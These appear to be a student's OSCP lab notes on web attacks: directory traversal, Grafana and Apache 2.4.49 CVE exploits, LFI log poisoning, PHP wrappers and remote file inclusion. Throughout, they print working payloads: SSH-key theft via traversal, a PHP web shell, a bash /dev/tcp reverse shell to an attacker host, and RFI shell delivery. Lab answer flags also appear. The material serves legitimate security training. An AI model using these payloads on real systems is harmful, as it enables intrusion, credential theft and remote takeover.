# Module 9: Common Web Application Attacks

## Tags
#OSCP #Module9 #DirectoryTraversal #FileInclusion #FileUpload #CommandInjection

---

## **Why This Module Matters**
Regardless of the underlying tech stack, a handful of vulnerability classes show up again and again across web applications. A symptom of skill shortages, time pressure, and fast-moving frameworks. This module covers four of the biggest: Directory Traversal, File Inclusion, File Upload, and Command Injection.

**✅ Status:** Module fully complete. 9.1 through 9.5 all done, every lab across every section finished.

---

## 9.1. Directory Traversal

#### Tags: #DirectoryTraversal #PathTraversal

---

### 9.1.1. Absolute vs Relative Paths

**Absolute path.** The full path from the filesystem root, always starts with `/` on Linux. Works from *any* current directory, since it doesn't depend on where you are.

**Relative path.** Built from wherever you currently are. `../` means "go up one directory". Chain them to go up further (`../../` means up two, etc).

**Step 1: Check current directory**
```bash
pwd
```
*e.g. `/home/kali`*

**Step 2: Use an absolute path, works regardless of current directory**
```bash
cat /etc/passwd
```

**Step 3: Use a relative path to reach the same file**
```bash
cat ../../etc/passwd
```
*From `/home/kali`, `../` takes you to `/home`, a second `../` takes you to `/` (root), then `etc/passwd` from there. Same result as Step 2.*

**Key insight:** once you've gone all the way up to `/`, extra `../` sequences are harmless no-ops. There's nowhere further back to go. So if you don't know your exact current directory, throwing in *more* `../` than strictly necessary is a safe way to guarantee you reach root before specifying the rest of the path.

#### Tags: #AbsolutePath #RelativePath #DotDotSlash

**Lab status: ✅ Completed:**

| Question | Answer |
|---|---|
| How many `../` to go from `/var/log/` to the root filesystem (`/`)? | **2** |
| Minimum-`../` command to display `/etc/passwd` from a current directory of `/usr/share/webshells/`? | **`cat ../../../etc/passwd`** |

#### Tags: #Lab #Quiz #Module9

---

### 9.1.2. Identifying and Exploiting Directory Traversals

**The vulnerability:** a web server maps URLs to files under a web root (e.g. `/var/www/html/` on Linux). `http://example.com/file.html` maps to `/var/www/html/file.html`. If a web app takes user input and uses it to build a filesystem path *without sanitizing it*, you can supply `../` sequences to escape the web root entirely and read arbitrary files.

**Identifying candidates. Things to check on every page:**
- Hover over every button/link, check where it actually points.
- Navigate every accessible page.
- View page source where possible.
- Pay close attention to any **parameter whose value looks like a filename**. That's the classic injection point.

**Reading a URL for clues, e.g.** `https://example.com/cms/login.php?language=en.html`:
- `login.php` tells you the app is written in PHP.
- `language=en.html` is a parameter whose value is itself a filename. Try requesting `en.html` directly to confirm it's a real file on the server, which means the parameter is likely being used to build a file-inclusion path.
- `/cms/` tells you the app lives in a subdirectory of the web root, not at the root itself.

**Case study: "Mountain Desserts" web app**

**Step 1: Add the target to `/etc/hosts`**
```bash
echo "192.168.156.16 mountaindesserts.local" | sudo tee -a /etc/hosts
```
![[Pasted image 20260731132210.png]]
**Step 2: Browse the app and look for a suspicious parameter**
Visit `http://mountaindesserts.local/meteor/index.php`, hover over links/buttons. An "Admin" link resolves to:
```
http://mountaindesserts.local/meteor/index.php?page=admin.php
```
*This is the tell. A `page` parameter whose value is a `.php` filename, on a PHP app (`index.php`). Classic Local File Inclusion / directory traversal shape.*
![[Pasted image 20260731132504.png]]
![[Pasted image 20260731132532.png]]

**Step 3: Confirm the parameter is doing file inclusion**
Visiting `index.php?page=admin.php` and `admin.php` directly both show the same "under maintenance" message. That confirms `index.php` is *including the content* of whatever `page` points to, not just linking to it.

**Step 4: Test for traversal with `/etc/passwd`**
```
http://mountaindesserts.local/meteor/index.php?page=../../../../../../../../../etc/passwd
```
*If vulnerable, the page renders the contents of `/etc/passwd`. Confirms both the traversal and that the app runs on Linux.*
![[Pasted image 20260731132814.png]]

**Step 5: Use the disclosed usernames to hunt for SSH keys**
`/etc/passwd` lists every user's home directory. Check each one for a `.ssh/id_rsa` (private key), since permissions are sometimes left too open:
```
http://mountaindesserts.local/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
```

> **Don't trust the browser for this part.** Browsers reformat/optimize rendered content, which can mangle a private key's formatting. Use `curl` (or Burp) instead once you've confirmed the vulnerability exists.

**Step 6: Retrieve the key cleanly with curl**
```bash
curl "http://mountaindesserts.local/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa"
```
![[Pasted image 20260731133143.png]]
*Copy everything from `-----BEGIN OPENSSH PRIVATE KEY-----` to `-----END OPENSSH PRIVATE KEY-----` (ignore the surrounding HTML) and save it to a file, e.g. `dt_key`.*

> **⚠️ Strongly recommended: skip manual copy/paste entirely, extract the key mechanically instead:**
> ```bash
> curl -s "http://mountaindesserts.local/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa" -o ~/raw_response.txt
> sed -n '/-----BEGIN OPENSSH PRIVATE KEY-----/,/-----END OPENSSH PRIVATE KEY-----/p' ~/raw_response.txt > ~/dt_key
> ```
> **Why this matters (lesson learned the hard way on this exact box):** manually copying a multi-line base64 key out of a terminal is an easy way to silently drop characters. A truncated line still *looks* fine at a glance but produces a corrupted key. The symptom was bizarre and misleading: `ssh -i dt_key ...` failed with `Load key "dt_key": error in libcrypto: unsupported`, which *sounds* like an OpenSSL-version/crypto-compatibility problem, not a "your copy-paste is missing 4 characters" problem. Things that looked like plausible causes but weren't: OpenSSL 3.x rejecting older RSA key formats, the `legacy` provider not being enabled. Both `ssh-keygen -p` **and** `puttygen` (an entirely independent, non-OpenSSL implementation) also refused to load the same file. That's the real tell: **when two unrelated crypto libraries both reject a key with generic "can't parse this" errors, suspect the file's content before suspecting either library.**
>
> **How it was actually confirmed and fixed:** re-extracted the key mechanically with `curl -o` + `sed` (above) into a second file, then ran `diff` against the manually-copied one. It showed one line missing its trailing `BA==`. The mechanically-extracted version connected immediately.
>
> **Takeaway for any future box:** whenever a vulnerability lets you *read* a multi-line secret (private key, certs, etc) through a browser or terminal, save it straight to a file via `curl -o` / redirection and extract with `sed`/`grep`/`awk`. Never retype or hand-copy it from what's rendered on screen.

**Step 7: Fix key permissions before use**
```bash
chmod 400 dt_key
```
*SSH refuses to use a private key file that's readable by others. Expect an "UNPROTECTED PRIVATE KEY FILE" error if you skip this.*
![[Pasted image 20260731133300.png]]
![[Pasted image 20260731133440.png]]

**Step 8: Connect via SSH using the stolen key**
```bash
ssh -i dt_key -p 2222 offsec@mountaindesserts.local
```
*Look for the flag in the SSH banner text shown immediately after the login succeeds. No need to enumerate further, it's right there on connect.*

> **Lab answer, VM #1:** flag from the SSH banner after logging in as `offsec`: **`OS{b0c2a9b9afe4fc57e906892d65555816}`**

🔁 **Similar to:** reading `/etc/passwd` via a traversal payload is the *exact* same PoC pattern Nessus used automatically back in [[Vulnerability Scanning#7.2.4. Analyzing the Results|Module 7, 7.2.4]] (and the win.ini equivalent on Windows), and the same pattern confirmed manually via Nmap NSE + `curl` in [[Vulnerability Scanning#7.3.2. Working with NSE Scripts|7.3.2]]. The difference here is going a step further: using the disclosed usernames to hunt for a private key and pivot to an actual shell, not just proving the read works.

**Directory traversal on Windows. A few key differences:**
- Test file: `C:\Windows\System32\drivers\etc\hosts` (world-readable, Windows' equivalent starter file to `/etc/passwd`).
- No direct equivalent to the "read `/etc/passwd`, find SSH key, login" vector. Windows makes traversal-to-shell noticeably harder.
- Without directory *listing*, you need to already know (or research) what's likely to be there. E.g. on IIS, check `C:\inetpub\logs\LogFiles\W3SVC1\` for logs and `C:\inetpub\wwwroot\web.config` for potential credentials.
- Try **both** `../` and `..\`. RFC 1738 says URLs should always use forward slashes, but some Windows-hosted apps are only vulnerable to the backslash form.

> ⚡ **Modern tool:** [[Ffuf]] can fuzz traversal depth and target-file payloads from a wordlist in one run, instead of manually adding more `../` and re-running `curl` each time like Step 4 above.

#### Tags: #LFI #EtcPasswd #SSHKeyTheft #CurlVsBrowser #WindowsTraversal #IISLogPaths #WebConfig

> 📋 Generalized copy-pasteable commands for this technique: [[Linux Methodology#Step 1b: Web Application Exploitation]]
> 🧭 Quick lookup: [[File Inclusion & Traversal (Decision Tree)|Decision Tree]]

---

**Case study 2: VM #2, Grafana CVE-2021-43798 (directory traversal via a core plugin path)**

Grafana versions 8.0.0-beta1 through 8.3.0 (before the patch) are vulnerable to a directory traversal reachable through any of its bundled core plugin paths. No authentication required.

**Step 1: Confirm the target and check its version**
```bash
curl http://192.168.156.193:3000/api/health
```
*Returns a small JSON blob including a `version` field, e.g. `{"commit":"8849243d27","database":"ok","version":"8.0.1"}`. Confirms both that Grafana is up on port 3000 and that the version falls in the vulnerable range.*

**Step 2: Exploit the traversal via the `alertlist` plugin path**
```bash
curl --path-as-is "http://192.168.156.193:3000/public/plugins/alertlist/../../../../../../../../../../Users/install.txt"
```
*`alertlist` is a core plugin bundled with every Grafana install, so its directory always exists to traverse out of. No need to guess/brute-force a plugin name. `--path-as-is` stops curl from locally collapsing the `../` sequences before sending the request (curl normally "cleans up" a path like this itself, which would defeat the traversal). This forces it to send the raw path and let Grafana's own buggy path handling do the traversal.*

> **Lab answer, VM #2:** contents of `C:\Users\install.txt`: **`OS{5f56a47bf6e90441199dcb4a6adfafa6}`**

🔁 **Similar to:** the research approach here (search for `<CVE> exploit/PoC` to find the specific vulnerable path/plugin) is the same workflow as finding a ready-made NSE script for a CVE back in [[Vulnerability Scanning#7.3.2. Working with NSE Scripts|7.3.2]]. Both cases: don't reinvent the exploit, look up the known-good PoC pattern for that specific CVE.

> 🔗 **HackTricks** general directory traversal/LFI reference: [github.com/HackTricks-wiki/hacktricks](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/file-inclusion/README.md) *(no dedicated Grafana/CVE-2021-43798 page found, this is the general traversal methodology page instead)* · **PayloadsAllTheThings** File Inclusion: [github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md), useful for the full plugin-ID list if `alertlist` isn't present or already patched.

#### Tags: #CVE202143798 #Grafana #PluginPathTraversal #CurlPathAsIs

**Lab status: ✅ Completed:**

| Question | Answer |
|---|---|
| VM #1: flag in the SSH banner after connecting with the stolen `offsec` private key? | **OS{b0c2a9b9afe4fc57e906892d65555816}** |
| VM #2: flag in `C:\Users\install.txt`, retrieved via CVE-2021-43798 traversal? | **OS{5f56a47bf6e90441199dcb4a6adfafa6}** |

#### Tags: #Lab #Quiz #Module9

---

### 9.1.3. Encoding Special Characters

Time to apply this against a vulnerability we've already met. Back in [[Vulnerability Scanning#7.2.4. Analyzing the Results|7.2.4]] and [[Vulnerability Scanning#7.3.1. NSE Vulnerability Scripts|7.3.1]]/[[Vulnerability Scanning#7.3.2. Working with NSE Scripts|7.3.2]], Nessus and Nmap NSE both flagged **Apache 2.4.49** (CVE-2021-41773) as vulnerable to directory traversal via `/cgi-bin/`. Here we exploit it by hand.

**Step 1: Try the obvious plain `../` payload first**
```bash
curl http://192.168.50.16/cgi-bin/../../../../etc/passwd
curl http://192.168.50.16/cgi-bin/../../../../../../../../../../etc/passwd
```
*Expect a `404 Not Found` on both, regardless of how many `../` you add. This doesn't mean the target isn't vulnerable. It means the plain-text `../` sequence specifically is being filtered (by Apache itself, a WAF, or the app).*

**Step 2: Bypass the filter with URL (percent) encoding**
```bash
curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```
*`%2e` is the percent-encoded form of a literal `.` character, so `%2e%2e` equals `..`. Filters that only pattern-match the literal string `../` miss this encoded equivalent. The web server itself still decodes and honors it as a real `../` once the request passes the filter. Expect `/etc/passwd`'s contents back this time.*

**The core lesson:** a filter blocking `../` isn't the same as a filter blocking *directory traversal*. Encoding is one of the simplest, most common ways to smuggle a blocked pattern past a filter that's only checking for its literal plain-text form.

🔁 **Similar to:** this is the exact same underlying **CVE-2021-41773** Apache bug already found automatically via Nessus in [[Vulnerability Scanning#7.2.4. Analyzing the Results|7.2.4]] and via Nmap's `vulners`/custom NSE script in [[Vulnerability Scanning#7.3.1. NSE Vulnerability Scripts|7.3.1]] to [[Vulnerability Scanning#7.3.2. Working with NSE Scripts|7.3.2]]. Those sections found and confirmed it with automated tooling. Here it's exploited by hand with nothing but `curl` and an understanding of URL encoding.

> 🔗 **PayloadsAllTheThings** File Inclusion: [github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md) · **HackTricks** File Inclusion: [github.com/HackTricks-wiki/hacktricks](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/file-inclusion/README.md), both cover encoding bypasses (double-encoding, UTF-8 overlong, null-byte tricks) for cases where simple `%2e%2e/` alone doesn't get past a filter.
> 🔗 **CyberChef** (has a "URL Encode"/"URL Decode" operation): [gchq.github.io/CyberChef](https://gchq.github.io/CyberChef/) *(linking to the tool itself, its recipe-state deep-links are JS-driven and can't be verified by an automated fetch)*

> **🛠️ Troubleshooting hit on VM #1: the module's own `%2e%2e/` pattern 404'd no matter the depth.**
> Neither `/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd` nor deeper variants (6, 8 segments) worked on this box. Even the plain `/etc/passwd` baseline 404'd. The fix was switching to the **actual, more precise public PoC pattern for CVE-2021-41773**, which has a distinct **first segment**:
> ```bash
> curl --path-as-is http://<target>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
> ```
> Note it's `.%2e` (a literal dot *plus* an encoded dot) for the first segment only, then plain `%2e%2e` for the rest. This exact pattern is what Nmap's `http-vuln-cve2021-41773` NSE script actually disclosed back in [[Vulnerability Scanning#7.3.2. Working with NSE Scripts|7.3.2]], so it was hiding in an earlier note the whole time.
> **Takeaway:** a module's simplified demo payload (uniform `%2e%2e/` repeated) may not reproduce on every vulnerable instance of the same CVE. When a well-known CVE's "obvious" payload doesn't land, check whether an earlier session/tool already disclosed the *exact* working PoC path, rather than only varying the traversal depth.

#### Tags: #URLEncoding #PercentEncoding #FilterBypass #CVE202141773 #Cgi-bin

**Lab status: ✅ Completed:**

| Question | Answer |
|---|---|
| VM #1: flag in `/opt/passwords`, retrieved via URL-encoded traversal in Apache 2.4.49? | **OS{1af37e7a17a01e534ab0c2f0d05a3fa2}** (required the `.%2e/%2e%2e/...` pattern, not the module's simpler `%2e%2e/` repeated) |
| VM #1: flag in `/opt/install.txt`, retrieved via Grafana CVE-2021-43798 (same VM, port 3000)? | **OS{dd7e13805482e421838adf638ff3124a}** |

#### Tags: #Lab #Quiz #Module9

---

## 9.2. File Inclusion Vulnerabilities

#### Tags: #FileInclusion #LFI #RFI

---

### 9.2.1. Local File Inclusion (LFI)

**File Inclusion vs. Directory Traversal. The distinction that matters:**
- **Directory Traversal** only lets you *read* a file's contents. Point it at `admin.php` and you get the raw PHP **source code**.
- **File Inclusion** actually *includes the file into the running application*. Point it at `admin.php` and the code **executes**, same as if you'd requested that page normally.
- Because inclusion executes the file, it also still works for plain content, so anything traversal could show you, inclusion can too. But the reverse isn't true. Confusing the two means potentially missing a code-execution opportunity where you thought you only had a read primitive.

**The exploitation goal here: RCE via Log Poisoning.** The idea: get attacker-controlled text containing executable code written into a log file, then use the LFI to *include* that log file. The server parses and executes whatever code is sitting in it.

**Case study: same "Mountain Desserts" app and `page` parameter from [[Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2]]**

**Step 1: Find a controllable field that ends up in a log file**
```bash
curl "http://mountaindesserts.local/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log"
```
*Apache's `access.log` includes the **User-Agent** header verbatim in every entry, and User-Agent is something we fully control on every request.*

**Step 2: Capture the Admin-link request in Burp Repeater**
Browse the app with Burp proxying, click **Admin**, find that request in **Proxy → HTTP History**, send it to **Repeater**.

![[Pasted image 20260731231901.png]]

**Step 3: Poison the log, replace the User-Agent with a PHP web shell snippet**
```
<?php echo system($_GET['cmd']); ?>
```
*Replace the `User-Agent` header value with this exact string, then click **Send**. This gets written verbatim into `access.log`. Apache doesn't care that it looks like code, it just logs it as text.*

> 🔍 Full breakdown of why `access.log`/`User-Agent` specifically, and why this only works with LFI (not plain traversal): [[File Inclusion & Traversal (Breakdowns)#LFI + log poisoning: why access.log and User-Agent specifically|Command Breakdowns]]

![[Pasted image 20260731232121.png]]

**Step 4: Trigger execution, include the poisoned log via the LFI, and pass a command**
Change the `page` parameter to the log file's relative path, and add a `cmd` parameter (joined with `&`):
```
../../../../../../../../../var/log/apache2/access.log&cmd=ps
```
*Remove the poisoned User-Agent from this request first. Otherwise you'd re-poison the log with another copy of the snippet, and the include would run **both** copies (duplicate execution).*

![[Pasted image 20260731232850.png]]

**Step 5: Handle spaces in multi-word commands**
A command like `ls -la` will error due to the literal space. Two fixes:
- **IFS (Internal Field Separator)** trick, a shell-level way of separating arguments without a literal space character.
- **URL-encode the space** as `%20`. Simplest option: `cmd=ls%20-la`.

> 📸 Screenshot: successful `ls -la` output after URL-encoding the space.

**Step 6: Escalate to a full reverse shell**
```bash
bash -c "bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1"
```
*Wrapping the one-liner in `bash -c "..."` matters. PHP's `system()` often runs commands via `sh` (Bourne shell), not `bash`, and the raw one-liner's `/dev/tcp` syntax isn't valid in `sh`. Wrapping it forces `bash` to interpret it regardless of the outer shell.*

URL-encode the whole thing before putting it in `cmd`:
```
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<attacker_ip>%2F4444%200%3E%261%22
```

> 🔗 **RevShells**: [revshells.com](https://www.revshells.com/) can generate this exact encoded payload for you (pick Bash, your IP/port, and its URL-encoded output option) instead of hand-encoding it *(linking to the tool itself, its shell-type/IP/port deep-link query params are JS-driven and can't be verified by an automated fetch)*.

**Step 7: Start a listener *before* sending the request**
```bash
nc -nvlp 4444
```

**Step 8: Send the request in Burp, catch the shell**
![[Pasted image 20260731233138.png]]

🔁 **Similar to:** the reverse-shell delivery mechanics here (URL-encoded payload, listener started first, `bash -c` wrapping) will come up again and again on future boxes. Worth comparing against whatever [[Linux Methodology#Step 2: Shells & Payloads|Shells & Payloads]] ends up holding as this vault grows.

**Step 9: Once shell lands, check for easy privesc**
```bash
whoami
id
sudo -l
```
*On WEB18 (VM #1), `www-data` turned out to have full passwordless sudo: `(ALL) NOPASSWD: ALL`. As easy as privesc gets.*

**Step 10: Read the flag with the granted sudo access**
```bash
cd /home/ariella
sudo cat flag.txt
```

> **Lab answer, VM #1:** **`OS{8a5a4cd6134d3fa734a361397c213aa0}`**

**LFI on Windows. What's different:**
- Same PHP snippet works unchanged (PHP's `system()` isn't OS-specific).
- Log file locations are application-specific, e.g. XAMPP: `C:\xampp\apache\logs\`.

**Beyond PHP:** the same log-poisoning concept applies to Perl, Active Server Pages (Extended), ASP, and JSP. Only the injected code snippet's language changes. In practice, PHP is by far the most common target for LFI in real assessments (other stacks are older/rarer, and modern frameworks tend to have LFI protections by default), though it's still worth knowing LFI can show up in modern Node.js backends too.

> 🔗 **HackTricks** File Inclusion/LFI: [github.com/HackTricks-wiki/hacktricks](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/file-inclusion/README.md), covers log-poisoning targets beyond Apache (PHP session files, mail logs, SSH auth logs, etc) and PHP wrapper tricks (coming next in 9.2.2).
> 🔗 **PayloadsAllTheThings** File Inclusion → LFI to RCE: [github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/LFI-to-RCE.md), maintained log-path list per OS/stack.

**Case study 2: VM #2, same technique on Windows/XAMPP**

Confirmed the app and traversal both still work identically on a Windows target first, using the hosts file as a safe baseline:
```bash
curl "http://192.168.132.193/meteor/index.php?page=../../../../../../../../../windows/system32/drivers/etc/hosts"
```
*This also happened to leak the web root path in a PHP notice earlier (`C:\xampp\htdocs\meteor\index.php`), confirming exactly where `apache/logs/` sits relative to it (`C:\xampp\` is the shared parent of both `htdocs\` and `apache\`).*

Poisoned the log via Burp Repeater exactly as before (User-Agent → PHP snippet → Send), then triggered with:
```
page=../../../../../../../../../xampp/apache/logs/access.log&cmd=dir
```
*Same traversal depth worked unchanged. Only the target path (`xampp/apache/logs/access.log` instead of `var/log/apache2/access.log`) differed.*

The `dir` output listed the web root's contents, including a suspiciously-named file sitting right next to `index.php`: `hopefullynobodyfindsthisfilebecauseitssupersecret.txt`. Since it was already inside the servable web root, no further LFI needed. Just requested it directly:
```bash
curl http://192.168.132.193/meteor/hopefullynobodyfindsthisfilebecauseitssupersecret.txt
```

> **Lab answer, VM #2:** **`OS{636d5b5a8b7a1e2b8a66bdd79263885a}`**

🔁 **Similar to:** finding a flag by running a directory-listing command (`dir`/`ls`) through code execution and spotting an oddly-named file is the same pattern as the Nessus Web Application Sitemap flag hunt back in [[Vulnerability Scanning#7.2.4. Analyzing the Results|7.2.4]]. Crawl/list first, then go straight for whatever doesn't belong.

#### Tags: #LFIvsTraversal #LogPoisoning #PHPWebShell #BurpRepeater #IFS #URLEncodedSpace #ReverseShell #BashCWrapper #WindowsXAMPP #DirCommand

**Extra case: VM #1, port 8001, direct LFI execution of a leftover `.php` backup file**

Same app, same vulnerable `page` parameter, just on a different port and a different target file. This time `/opt/admin.bak.php`, a backup script left outside the web root. Since `page` performs **inclusion** rather than a plain read, pointing it straight at this file executes it rather than just showing source:
```bash
curl "http://mountaindesserts.local:8001/meteor/index.php?page=../../../../../../../../../opt/admin.bak.php"
```
*No log poisoning needed here at all. The target file is already valid, executable PHP sitting on disk. LFI alone is enough to run it. Its output included the flag directly in the rendered page text.*

> **Lab answer:** **`OS{f20384824c781af11d2276065895e9e5}`**

**Lab status: ✅ Completed:**

| Question | Answer |
|---|---|
| VM #1 (WEB18): flag from `/home/ariella/flag.txt`, via LFI reverse shell + `sudo -l`? | **OS{8a5a4cd6134d3fa734a361397c213aa0}** |
| VM #1, port 8001: flag from executing `/opt/admin.bak.php` via LFI? | **OS{f20384824c781af11d2276065895e9e5}** |
| VM #2 (Windows/XAMPP): flag from log-poisoning a `dir` command via `access.log`? | **OS{636d5b5a8b7a1e2b8a66bdd79263885a}** |
![[Pasted image 20260731234727.png]]
![[Pasted image 20260731235128.png]]

#### Tags: #Lab #Quiz #Module9

---

### 9.2.2. PHP Wrappers

PHP wrappers are built-in protocol handlers that extend what a filename/path argument can mean to PHP, including things like "read this through a filter" or "treat this literal string as if it were a file." Two are covered here: `php://filter` and `data://`.

**`php://filter`: read a PHP file's *source* instead of executing it.**

Normally, including a `.php` file via LFI **executes** it (per [[Common Web Application Attacks#9.2.1. Local File Inclusion (LFI)|9.2.1]]'s distinction), so anything the PHP code itself *outputs* is all you see. The actual PHP source and any hardcoded secrets in it stay invisible. `php://filter` sidesteps this by applying a filter to the file *before* it's included, which can mean converting it to something that no longer gets executed as code.

**Step 1: Confirm the normal (executed) behavior first**
```bash
curl "http://mountaindesserts.local/meteor/index.php?page=admin.php"
```
*Notice the output cuts off abruptly (unclosed `<body>` tag). That's a sign PHP code further down in the file **ran** (and likely errored or exited) rather than being displayed as text.*

**Step 2: Try `php://filter` with no encoding first**
```bash
curl "http://mountaindesserts.local/meteor/index.php?page=php://filter/resource=admin.php"
```
*`resource=` is the required parameter naming the file to filter (accepts absolute or relative paths). Expect the exact same output as Step 1. With no actual filter applied, the file still gets executed same as a normal include.*

**Step 3: Apply base64 encoding, this is what actually prevents execution**
```bash
curl "http://mountaindesserts.local/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php"
```
*Now the file gets base64-encoded **before** inclusion. Encoded text isn't valid PHP syntax, so it can't execute. It just gets echoed out as a harmless base64 blob instead. Expect a long base64 string in the response.*

**Step 4: Decode it**
```bash
echo "<paste the base64 string here>" | base64 -d
```
*This reveals the actual PHP **source code**, including anything hardcoded in it, like database credentials (`$username`, `$password` variables etc).*

> 🔗 **CyberChef** (has a "From Base64" operation): [gchq.github.io/CyberChef](https://gchq.github.io/CyberChef/), works just as well as `base64 -d` if you'd rather paste it into a browser tab than the terminal.

🔁 **Similar to:** this is conceptually the same "make the scanner/tool show you something it wouldn't otherwise" idea as URL-encoding a traversal payload back in [[Common Web Application Attacks#9.1.3. Encoding Special Characters|9.1.3]]. Here it's PHP's own filter chain doing the "encoding," not you.

**`data://`: embed your own code directly in the URL, no file/log poisoning needed.**

Where log poisoning (9.2.1) requires *writing* your payload somewhere on disk first, `data://` lets you supply the "file" content **inline**, right in the request. Useful when you have no writable/poisonable location to plant a payload in.

**Step 5: Execute a plain command via `data://text/plain`**
```bash
curl "http://mountaindesserts.local/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
```
*The PHP snippet is URL-encoded directly into the `page` value itself. No log poisoning, no separate write step. Expect a directory listing in the response.*

**Step 6: Base64-encode the payload instead, for filter evasion**
```bash
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
```
Then:
```bash
curl "http://mountaindesserts.local/meteor/index.php?page=data://text/plain;base64,<paste base64 output here>&cmd=ls"
```
*Useful if a WAF/filter is blocking plaintext strings like `system` in the URL. Base64 hides them from naive pattern-matching filters, same evasion logic as the URL-encoding bypass in 9.1.3.*

> **Caveat:** `data://` doesn't work on a default PHP install. It requires `allow_url_include` to be enabled in `php.ini`. If `data://` attempts fail outright, check whether log poisoning (9.2.1) is viable instead.

> 🔗 **HackTricks** File Inclusion/LFI: [github.com/HackTricks-wiki/hacktricks](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/file-inclusion/README.md), has a much longer list of PHP wrappers beyond these two (`php://input`, `expect://`, `zip://`, `phar://`, etc).
> 🔗 **PayloadsAllTheThings** File Inclusion → Wrappers: [github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md), dedicated wrapper-based LFI-to-RCE techniques per PHP version/config.

#### Tags: #PHPWrappers #PhpFilterWrapper #Base64Filter #DataWrapper #AllowUrlInclude #FilterEvasion

**Lab status: ✅ Completed:**

| Question | Answer |
|---|---|
| VM #1 (WEB18): flag from `/var/www/html/backup.php` source via `php://filter` + base64? | **OS{ec82f84a4a554dded2868d5041695ec0}** (found in a PHP comment, visible only via source read, invisible to a normal visitor since the file executes rather than displays by default) |
| VM #1 (WEB18): Linux kernel version via `data://` executing `uname -a`? | **5.4.0-212-generic** |

#### Tags: #Lab #Quiz #Module9

---

### 9.2.3. Remote File Inclusion (RFI)

**RFI vs. LFI:** LFI includes a file already sitting on the target's own filesystem. **RFI includes a file from a remote system entirely**, served over HTTP or SMB, and it still executes in the web app's context, same as LFI. Same underlying bug class (an unsanitized `include()`-style parameter), just pointed off-box instead of at a local path.

**Why RFI is rarer than LFI:** it requires `allow_url_include` to be enabled in PHP, off by default in every current PHP version (same setting the `data://` wrapper needed back in [[Common Web Application Attacks#9.2.2. PHP Wrappers|9.2.2]]). Most commonly found enabled where an app is *designed* to pull in remote libraries/data as part of normal operation.

**Identifying RFI candidates:** exact same process as Directory Traversal/LFI ([[Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2]]). Look for a parameter that takes a filename/path. If LFI works on it, it's worth testing whether it'll also fetch a URL.

**Kali ships ready-made PHP webshells** at `/usr/share/webshells/php/`. `simple-backdoor.php` is a minimal one:
```php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```
*Same shape as the PHP snippets used for log poisoning/`data://`. Accepts a `cmd` parameter, runs it via `system()`.*

**Step 1: Host the webshell on your Kali box**
```bash
cd /usr/share/webshells/php/
python3 -m http.server 80
```
*`http.server` serves the **current directory** as the web root, so `simple-backdoor.php` becomes reachable at `http://<your_ip>/simple-backdoor.php`.*

**Step 2: Include it remotely via the vulnerable `page` parameter**
```bash
curl "http://mountaindesserts.local/meteor/index.php?page=http://<your_ip>/simple-backdoor.php&cmd=ls"
```
*The target fetches your hosted PHP file over HTTP and executes it. Same `cmd`-parameter pattern as before, just delivered remotely instead of via log poisoning or `data://`.*

**Step 3: Read a target file through the RFI'd webshell**
```bash
curl "http://mountaindesserts.local/meteor/index.php?page=http://<your_ip>/simple-backdoor.php&cmd=cat+/home/elaine/.ssh/authorized_keys"
```
*A `command="..."` prefix on an `authorized_keys` entry restricts what that key is allowed to run when used for SSH login. On VM #1, that restriction string was the flag itself.*

> **Lab answer, VM #1, port 80:** **`OS{8d547e22681b8cb6c0e9f470662ae659}`**

**Escalating to a reverse shell: VM #1, port 8001, Pentestmonkey's `php-reverse-shell.php`**

**Step 4: Locate a copy (Kali ships one)**
```bash
find / -iname "*php-reverse-shell*" 2>/dev/null
```
*`/usr/share/webshells/php/php-reverse-shell.php` is the one to use. Same directory as `simple-backdoor.php`.*

**Step 5: Edit its `$ip`/`$port` to point at your Kali box**
```bash
cd /usr/share/webshells/php/
sed -i "s/\$ip = '127.0.0.1';/\$ip = '<your_ip>';/" php-reverse-shell.php
sed -i "s/\$port = 1234;/\$port = 4444;/" php-reverse-shell.php
```

**Step 6: Start the listener, then trigger the RFI**
```bash
nc -nvlp 4444
```
```bash
curl "http://mountaindesserts.local:8001/meteor/index.php?page=http://<your_ip>/php-reverse-shell.php"
```
*Don't expect to see anything meaningful in the `curl` response itself. This payload's output all goes down the reverse-shell connection, not back over HTTP. Check the netcat terminal instead.*

**Step 7: Once shell lands, check for easy privesc and grab the flag**
```bash
whoami
sudo -l
sudo cat /home/guybrush/.treasure/flag.txt
```
*`www-data` again turned out to have full passwordless sudo on this box, same as [[Common Web Application Attacks#9.2.1. Local File Inclusion (LFI)|9.2.1]]'s VM #1.*

> **Lab answer, VM #1, port 8001:** **`OS{79057299916d97dc2c085b332ca74e60}`**

> **🛠️ Troubleshooting hit here: netcat listener never caught the connection, HTTP server logged a 404.**
